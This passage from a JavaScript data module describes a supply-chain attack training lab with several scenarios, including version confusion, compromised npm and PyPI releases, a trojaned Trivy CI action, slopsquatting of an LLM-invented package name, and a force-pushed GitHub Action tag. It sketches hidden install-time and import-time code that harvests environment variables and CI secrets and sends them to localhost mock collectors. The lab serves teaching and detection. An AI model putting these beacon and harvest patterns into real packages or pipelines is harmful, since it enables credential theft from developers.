          "version-confuser-lib"
        ],
        [
          "version",
          "999.999.999"
        ],
        [
          "path",
          "registry/…/999.999.999"
        ],
        [
          "role",
          "installed / active"
        ],
        [
          "trigger",
          "require → anonymous top-level"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "version-confuser-lib",
        "version-confuser-lib",
        false
      ],
      [
        "version",
        "1.0.1",
        "999.999.999",
        true
      ],
      [
        "path",
        "registry/…/1.0.1",
        "registry/…/999.999.999",
        true
      ],
      [
        "payload",
        "(none)",
        "anonymous top-level",
        true
      ],
      [
        "deception",
        "expected semver",
        "ultra-high version wins",
        true
      ]
    ],
    "deceptionPill": "ultra-high version wins",
    "victimDep": {
      "label": "victim-app/package.json",
      "lines": [
        "dependencies: {",
        "  \"version-confuser-lib\": \"file:../registry/version-confuser-lib/1.0.1\"",
        "}  (lab also exercises 999.999.999)"
      ]
    },
    "legitCode": {
      "title": "registry/…/1.0.1/index.js",
      "lines": [
        "version-confuser-lib@1.0.1",
        "module.exports = { run }",
        "✓ No TESTBENCH gated network",
        "✓ No top-level side effects"
      ]
    },
    "malCode": {
      "title": "registry/…/999.999.999/index.js",
      "lines": [
        "anonymous top-level",
        "  if (TESTBENCH_MODE === 'enabled')",
        "    http.request POST localhost:3020/collect",
        "Body: selectedVersion:999.999.999",
        "module.exports = { run }          ← cover"
      ]
    },
    "codeEdgePill": "same name; version trap",
    "triggerStrip": "Trigger: require → anonymous top-level  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST localhost:3020/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: run() still works",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "seed registry version trees",
      "cd victim-app && npm install / swap",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://localhost:3020",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "install / load 999.999.999 build",
      "npm start → require beacons",
      "compare with 1.0.1 clean tree"
    ],
    "runtime": {
      "victimBox": [
        "victim-app",
        "require(version-confuser-lib)"
      ],
      "malBox": [
        "999.999.999/index.js",
        "anonymous top-level"
      ],
      "payloadTitle": "HTTP request in anonymous top-level",
      "payloadLines": [
        "http.request({",
        "  hostname: 'localhost',",
        "  port: 3020,",
        "  path: '/collect',",
        "  method: 'POST'",
        "})",
        "Body: selectedVersion:999.999.999"
      ],
      "mockTitle": "mock-server :3020 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('20','version-exfil')"
      ],
      "coverTitle": "After beacon: run() cover API",
      "coverLines": [
        "module.exports = { run }",
        "returns ok + version string",
        "ultra-high version looks “newer”"
      ],
      "visibleLines": [
        "VISIBLE: lib loads + run() OK",
        "HIDDEN: :3020 beacon on require",
        "HINT: compare 1.0.1 vs 999.999.999 trees"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3020/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. Version 999.999.999 anomaly",
      "2. anonymous top-level on require",
      "3. Port 3020",
      "4. Same package name as clean 1.0.1",
      "5. http to localhost:3020/collect"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is localhost only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3020",
    "endpointPath": "/collect"
  },
  "21": {
    "id": "21",
    "title": "Axios-style Compromised Release",
    "folder": "21-axios-compromised-release-attack",
    "subtitle": "What the developer sees vs what actually runs — axios-like-1.14.1.tgz pulls plain-crypto-js-like whose postinstall POSTs /beacon :3021",
    "intended": {
      "title": "Intended (review-only)",
      "path": "packages/axios-like-1.14.0",
      "metaRows": [
        [
          "name",
          "axios-like"
        ],
        [
          "version",
          "1.14.0"
        ],
        [
          "path",
          "packages/axios-like-1.14.0"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "packages/axios-like-1.14.1.tgz",
      "metaRows": [
        [
          "name",
          "axios-like (+ plain-crypto-js-like)"
        ],
        [
          "version",
          "1.14.1"
        ],
        [
          "path",
          "tgz + plain-crypto-js-like"
        ],
        [
          "role",
          "installed / active"
        ],
        [
          "trigger",
          "plain-crypto postinstall"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "axios-like",
        "axios-like",
        false
      ],
      [
        "version",
        "1.14.0",
        "1.14.1 (+ crypto dep)",
        true
      ],
      [
        "install",
        "clean folder",
        "axios-like-1.14.1.tgz",
        true
      ],
      [
        "payload",
        "(none)",
        "plain-crypto postinstall",
        true
      ],
      [
        "endpoint",
        "N/A",
        "POST /beacon :3021",
        true
      ]
    ],
    "deceptionPill": "patch + unexpected dep",
    "victimDep": {
      "label": "victim-app/package.json",
      "lines": [
        "dependencies: {",
        "  \"axios-like\": \"file:../packages/axios-like-1.14.1.tgz\"",
        "}"
      ]
    },
    "legitCode": {
      "title": "packages/axios-like-1.14.0",
      "lines": [
        "axios-like@1.14.0 clean HTTP client",
        "✓ No plain-crypto dependency",
        "✓ No postinstall beacon",
        "✓ No TESTBENCH gated network"
      ]
    },
    "malCode": {
      "title": "plain-crypto-js-like/postinstall.js",
      "lines": [
        "anonymous top-level (postinstall)",
        "  if (TESTBENCH_MODE !== 'enabled') exit",
        "  write .testbench-axios-ioc.json",
        "  http.request POST localhost:3021/beacon",
        "  may swap package.json → package.clean.json",
        "Body: type:postinstall-beacon"
      ]
    },
    "codeEdgePill": "tgz + transitive postinstall",
    "triggerStrip": "Trigger: plain-crypto-js-like postinstall  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST localhost:3021/beacon  ·  Evidence: infrastructure/captured-data.json  ·  Cover: axios-like API + decoy package.json",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "seed axios-like-1.14.1.tgz + crypto",
      "cd victim-app && npm install",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://localhost:3021",
      "init captured-data.json {captures:[]}",
      "POST /beacon · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "cd victim-app && npm install",
      "  installs axios-like-1.14.1.tgz",
      "  → plain-crypto-js-like postinstall",
      "npm start"
    ],
    "runtime": {
      "victimBox": [
        "victim-app",
        "npm install tgz"
      ],
      "malBox": [
        "plain-crypto postinstall",
        "anonymous top-level"
      ],
      "payloadTitle": "HTTP request in anonymous postinstall",
      "payloadLines": [
        "http.request({",
        "  hostname: 'localhost',",
        "  port: 3021,",
        "  path: '/beacon',",
        "  method: 'POST'",
        "})",
        "Body: type:postinstall-beacon,",
        "  package:plain-crypto-js-like"
      ],
      "mockTitle": "mock-server :3021 on POST /beacon",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('21','postinstall-beacon')"
      ],
      "coverTitle": "After beacon: decoy package.json",
      "coverLines": [
        "may rewrite installed package.json",
        "axios-like client still usable",
        "IOC: .testbench-axios-ioc.json"
      ],
      "visibleLines": [
        "VISIBLE: tgz install + client OK",
        "HIDDEN: /beacon from plain-crypto",
        "HINT: check unexpected dependency + IOC"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3021/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. Dep is axios-like-1.14.1.tgz",
      "2. Unexpected plain-crypto-js-like postinstall",
      "3. POST /beacon (not /collect)",
      "4. Decoy package.json anti-forensics",
      "5. Port 3021"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is localhost only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3021",
    "endpointPath": "/beacon"
  },
  "22": {
    "id": "22",
    "title": "LiteLLM-style PyPI Compromise",
    "folder": "22-litellm-pypi-compromise",
    "subtitle": "What the developer sees vs what actually runs — litellm_like Python packages; run_victim.py import triggers _import_trigger → 127.0.0.1:3022",
    "intended": {
      "title": "Intended (review-only)",
      "path": "python-packages/v1_82_6",
      "metaRows": [
        [
          "name",
          "litellm_like"
        ],
        [
          "version",
          "1.82.6"
        ],
        [
          "path",
          "python-packages/v1_82_6"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "python-packages/v1_82_7 (+ v1_82_8 pth)",
      "metaRows": [
        [
          "name",
          "litellm_like"
        ],
        [
          "version",
          "1.82.7 / 1.82.8"
        ],
        [
          "path",
          "python-packages/v1_82_7|8"
        ],
        [
          "role",
          "installed / active"
        ],
        [
          "trigger",
          "_import_trigger / _pth_startup"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "litellm_like",
        "litellm_like",
        false
      ],
      [
        "version",
        "1.82.6",
        "1.82.7 (+1.82.8 pth)",
        true
      ],
      [
        "trigger",
        "none",
        "_import_trigger / _pth_startup",
        true
      ],
      [
        "host",
        "N/A",
        "127.0.0.1:3022",
        true
      ],
      [
        "victim",
        "N/A",
        "run_victim.py",
        true
      ]
    ],
    "deceptionPill": "PyPI patch + .pth hook",
    "victimDep": {
      "label": "victim-app/run_victim.py",
      "lines": [
        "imports litellm_like (Python)",
        "exercises 1.82.7 import-time path",
        "(not an npm package.json dep)"
      ]
    },
    "legitCode": {
      "title": "python-packages/v1_82_6",
      "lines": [
        "litellm_like@1.82.6 clean",
        "✓ No import-time network",
        "✓ No .pth startup hook",
        "✓ No TESTBENCH gated urllib"
      ]
    },
    "malCode": {
      "title": "v1_82_7 __init__.py (+ v1_82_8 pth)",
      "lines": [
        "def _import_trigger() → urllib to",
        "  http://127.0.0.1:3022/collect",
        "_import_trigger() at import time",
        "v1_82_8: def _pth_startup() same host",
        "mock_server.py listens :3022"
      ]
    },
    "codeEdgePill": "import / .pth hooks",
    "triggerStrip": "Trigger: _import_trigger() on import (and _pth_startup for 1.82.8)  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST 127.0.0.1:3022/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: package still imports",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "pip install python-packages/v1_82_7",
      "start infrastructure/mock_server.py",
      "cd victim-app && python run_victim.py"
    ],
    "mockLines": [
      "python infrastructure/mock_server.py",
      "listen http://127.0.0.1:3022",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "pip install compromised wheel/sdist",
      "python victim-app/run_victim.py",
      "  → import litellm_like",
      "  → _import_trigger() beacon"
    ],
    "runtime": {
      "victimBox": [
        "run_victim.py",
        "import litellm_like"
      ],
      "malBox": [
        "_import_trigger()",
        "urllib.request"
      ],
      "payloadTitle": "HTTP via _import_trigger() (urllib)",
      "payloadLines": [
        "urllib.request.urlopen(",
        "  'http://127.0.0.1:3022/collect', data=…)",
        "Body: type:import-trigger,",
        "  package:litellm_like, version:1.82.7",
        "1.82.8 path uses _pth_startup()"
      ],
      "mockTitle": "mock_server.py :3022 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "floci_exfil.upload_json('22',…)"
      ],
      "coverTitle": "After beacon: import still succeeds",
      "coverLines": [
        "print imported litellm_like version",
        "marker: .testbench-litellm-import.json",
        "package appears usable"
      ],
      "visibleLines": [
        "VISIBLE: python import succeeds",
        "HIDDEN: 127.0.0.1:3022 import trigger",
        "HINT: curl 127.0.0.1:3022/captured-data"
      ]
    },
    "verifyLines": [
      "curl -s http://127.0.0.1:3022/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. Python package litellm_like (not npm)",
      "2. Victim entrypoint run_victim.py",
      "3. Host 127.0.0.1:3022",
      "4. Functions _import_trigger / _pth_startup",
      "5. mock_server.py (Python) collector"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is 127.0.0.1 only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3022",
    "endpointPath": "/collect"
  },
  "23": {
    "id": "23",
    "title": "Trivy Supply Chain Attack (CVE-2026-33634)",
    "folder": "23-trivy-supply-chain-attack",
    "subtitle": "What the developer sees vs what actually runs — victim-ci requires trivy-action-like; harvestAndExfiltrate POSTs 127.0.0.1:3023/collect on load",
    "intended": {
      "title": "Intended (review-only)",
      "path": "legitimate/trivy-scanner",
      "metaRows": [
        [
          "name",
          "trivy-scanner-like"
        ],
        [
          "version",
          "0.69.2"
        ],
        [
          "path",
          "legitimate/trivy-scanner"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "malicious-trivy/v0.69.4",
      "metaRows": [
        [
          "name",
          "trivy-action-like"
        ],
        [
          "version",
          "0.69.4"
        ],
        [
          "path",
          "malicious-trivy/v0.69.4"
        ],
        [
          "role",
          "installed / active"
        ],
        [
          "trigger",
          "require → harvestAndExfiltrate"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "trivy-scanner-like",
        "trivy-action-like",
        true
      ],
      [
        "version",
        "0.69.2",
        "0.69.4",
        true
      ],
      [
        "path",
        "legitimate/trivy-scanner",
        "malicious-trivy/v0.69.4",
        true
      ],
      [
        "payload",
        "(none)",
        "harvestAndExfiltrate",
        true
      ],
      [
        "host",
        "N/A",
        "127.0.0.1:3023",
        true
      ]
    ],
    "deceptionPill": "CI scanner still “scans”",
    "victimDep": {
      "label": "victim-ci/package.json",
      "lines": [
        "dependencies: {",
        "  \"trivy-action-like\": \"file:../malicious-trivy/v0.69.4\"",
        "}"
      ]
    },
    "legitCode": {
      "title": "legitimate/trivy-scanner",
      "lines": [
        "trivy-scanner-like@0.69.2",
        "scripts.scan → node index.js",
        "✓ No harvest on require",
        "✓ No TESTBENCH gated network"
      ]
    },
    "malCode": {
      "title": "malicious-trivy/v0.69.4/trivy-action-like.js",
      "lines": [
        "function harvestAndExfiltrate() {",
        "  if (TESTBENCH_MODE !== 'enabled') return",
        "  hostname: '127.0.0.1', port: 3023,",
        "  path: '/collect'",
        "}",
        "harvestAndExfiltrate() on module load",
        "scanTarget / printSummary ← cover"
      ]
    },
    "codeEdgePill": "scan cover after harvest",
    "triggerStrip": "Trigger: require → harvestAndExfiltrate()  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST 127.0.0.1:3023/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: scanTarget still prints report",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "seed malicious-trivy/v0.69.4",
      "start mock-c2-server.js :3023",
      "cd victim-ci && npm install"
    ],
    "mockLines": [
      "node infrastructure/mock-c2-server.js",
      "listen http://localhost:3023",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "cd victim-ci && npm install",
      "npm run ci  # node run-pipeline.js",
      "  require(\"trivy-action-like\")",
      "  → harvestAndExfiltrate before scan"
    ],
    "runtime": {
      "victimBox": [
        "victim-ci/run-pipeline.js",
        "require(trivy-action-like)"
      ],
      "malBox": [
        "harvestAndExfiltrate()",
        "http.request"
      ],
      "payloadTitle": "HTTP request built in harvestAndExfiltrate()",
      "payloadLines": [
        "http.request({",
        "  hostname: '127.0.0.1',",
        "  port: 3023,",
        "  path: '/collect',",
        "  method: 'POST'",
        "})",
        "Body: harvested CI env + path checks"
      ],
      "mockTitle": "mock-c2-server :3023 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('23','trivy-exfil')"
      ],
      "coverTitle": "After beacon: scanTarget cover",
      "coverLines": [
        "scanTarget() still returns report",
        "printSummary looks like real Trivy",
        "CI step appears successful"
      ],
      "visibleLines": [
        "VISIBLE: CI pipeline + scan output",
        "HIDDEN: 127.0.0.1:3023 harvest on require",
        "HINT: curl localhost:3023/captured-data"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3023/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. Victim is victim-ci (not victim-app)",
      "2. Function harvestAndExfiltrate on load",
      "3. Host 127.0.0.1:3023",
      "4. run-pipeline.js requires action before scan",
      "5. mock-c2-server.js collector"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is 127.0.0.1 only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3023",
    "endpointPath": "/collect"
  },
  "24": {
    "id": "24",
    "title": "Slopsquatting",
    "folder": "24-slopsquatting",
    "subtitle": "LLM-hallucinated package name installed and beaconing on require - metadata, payload path, TESTBENCH gate, mock endpoint, and cover traffic",
    "intended": { "title": "Intended (review-only)", "path": "npm registry search for array-sortify", "metaRows": [] },
    "malicious": { "title": "Installed (victim uses)", "path": "malicious-packages/array-sortify", "metaRows": [] },
    "compareRows": [],
    "deceptionPill": "LLM hallucinated name",
    "victimDep": { "label": "victim-app/package.json", "lines": ["dependencies: {", "  \"array-sortify\": \"^1.0.0\"", "}"] },
    "legitCode": { "title": "none (name does not exist)", "lines": ["No legitimate package registered", "LLM invented the name", "Developer copied install command"] },
    "malCode": { "title": "malicious-packages/array-sortify/index.js", "lines": ["if (TESTBENCH_MODE !== 'enabled') return;", "http.request({ hostname: '127.0.0.1', port: 3024, path: '/collect' });", "Body: hostname + env vars + package metadata"] },
    "codeEdgePill": "malicious sort helper on require",
    "triggerStrip": "Trigger: require/import (NOT postinstall)  -  Gate: TESTBENCH_MODE === 'enabled'  -  Exfil: POST 127.0.0.1:3024/collect  -  Evidence: infrastructure/captured-data.json  -  Cover: array-sortify still returns sorted data",
    "setupLines": ["source enable-testbench.sh", "  -> TESTBENCH_MODE=enabled", "cd victim-app", "npm install --ignore-scripts", "npm start"],
    "mockLines": ["node infrastructure/mock-server.js", "listen http://localhost:3024", "init captured-data.json {captures:[]}", "POST /collect - GET /captured-data", "DELETE /captured-data"],
    "labLines": ["cd victim-app", "npm install array-sortify", "npm start", "require(\"array-sortify\") runs payload"],
    "runtime": {
      "victimBox": ["victim-app/index.js", "require(array-sortify)"],
      "malBox": ["array-sortify/index.js", "http.request"],
      "payloadTitle": "HTTP request built on module load",
      "payloadLines": ["http.request({", "  hostname: '127.0.0.1',", "  port: 3024,", "  path: '/collect',", "  method: 'POST'", "})"],
      "mockTitle": "mock-server :3024 on POST /collect",
      "mockLines": ["parse JSON -> log CAPTURED DATA", "append captures[] -> write captured-data.json -> 200"],
      "flociLines": ["SCAS_FLOCI_ENABLED=1", "uploadJson('24','slopsquat-exfil')"],
      "coverTitle": "After beacon: sort helper still works",
      "coverLines": ["exports.sortArray returns sorted data", "Application output looks normal", "No visible error to developer"],
      "visibleLines": ["VISIBLE: npm install + npm start output", "HIDDEN: 127.0.0.1:3024 beacon on require", "HINT: curl localhost:3024/captured-data"]
    },
    "verifyLines": ["curl -s http://localhost:3024/captured-data", "-> { \"captures\": [ { timestamp, data } ] }", "", "or read:", "  infrastructure/captured-data.json"],
    "redFlags": ["1. Package name invented by LLM", "2. No registry verification", "3. Host 127.0.0.1:3024", "4. Exfil on require", "5. Copy-paste install command"],
    "safetyLines": ["TESTBENCH_MODE must be enabled", "  else [SAFE MODE] and stop", "Exfil hostname is 127.0.0.1 only", "Educational labels in package metadata", "setup.sh -> enable-testbench.sh"],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3024",
    "endpointPath": "/collect"
  },
  "25": {
    "id": "25",
    "title": "Compromised Reusable GitHub Action",
    "folder": "25-compromised-github-action",
    "subtitle": "Force-pushed mutable action tag harvests CI secrets before running legitimate workflow steps",
    "intended": { "title": "Intended (review-only)", "path": "example/actions/checkout@v3 (clean SHA)", "metaRows": [] },
    "malicious": { "title": "Installed (workflow uses)", "path": "example/actions/checkout@v3 (force-pushed)", "metaRows": [] },
    "compareRows": [],
    "deceptionPill": "mutable tag moved to malicious commit",
    "victimDep": { "label": "victim-app/.github/workflows/ci.yml", "lines": ["- uses: example/actions/checkout@v3", "  with:", "    repo-token: ${{ secrets.GITHUB_TOKEN }}"] },
    "legitCode": { "title": "legitimate action/index.js", "lines": ["function run() {", "  checkoutRepo();", "}", "run();"] },
    "malCode": { "title": "malicious action/index.js", "lines": ["function run() {", "  if (TESTBENCH_MODE === 'enabled') harvest();", "  checkoutRepo();", "}", "run();"] },
    "codeEdgePill": "harvest before cover action",
    "triggerStrip": "Trigger: workflow runs action  -  Gate: TESTBENCH_MODE === 'enabled'  -  Exfil: POST 127.0.0.1:3025/collect  -  Evidence: infrastructure/captured-data.json  -  Cover: checkout still succeeds",
    "setupLines": ["source enable-testbench.sh", "  -> TESTBENCH_MODE=enabled", "plant lookalike CI secrets .env.ci-lab", "./run-ci.sh (act or npm start)"],
    "mockLines": ["node infrastructure/mock-server.js", "listen http://localhost:3025", "init captured-data.json {captures:[]}", "POST /collect - GET /captured-data", "DELETE /captured-data"],
    "labLines": ["./run-ci.sh", "act maps checkout@v3 -> local action", "or npm start fallback", "harvest -> checkout"],
    "runtime": {
      "victimBox": ["victim-app/.github/workflows/ci.yml", "uses: checkout@v3"],
      "malBox": ["action/index.js", "harvestAndExfiltrate"],
      "payloadTitle": "HTTP request built in harvestAndExfiltrate()",
      "payloadLines": ["http.request({", "  hostname: '127.0.0.1',", "  port: 3025,", "  path: '/collect',", "  method: 'POST'", "})"],
      "mockTitle": "mock-server :3025 on POST /collect",
      "mockLines": ["parse JSON -> log CAPTURED DATA", "append captures[] -> write captured-data.json -> 200"],
      "flociLines": ["SCAS_FLOCI_ENABLED=1", "uploadJson('25','action-exfil')"],
      "coverTitle": "After beacon: checkout cover",
      "coverLines": ["checkoutRepo() still runs", "Workflow output appears normal", "CI step appears successful"],
      "visibleLines": ["VISIBLE: CI workflow + checkout output", "HIDDEN: 127.0.0.1:3025 harvest before cover", "HINT: curl localhost:3025/captured-data"]
    },
    "verifyLines": ["curl -s http://localhost:3025/captured-data", "-> { \"captures\": [ { timestamp, data } ] }", "", "or read:", "  infrastructure/captured-data.json"],
    "redFlags": ["1. Mutable action tag @v3", "2. GITHUB_TOKEN passed to action", "3. Host 127.0.0.1:3025", "4. Harvest before legitimate step", "5. Force-pushed tag"],
    "safetyLines": ["TESTBENCH_MODE must be enabled", "  else [SAFE MODE] and stop", "Exfil hostname is 127.0.0.1 only", "Educational labels in action metadata", "setup.sh -> enable-testbench.sh"],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3025",
    "endpointPath": "/collect"
  }

};

module.exports = { DETAIL };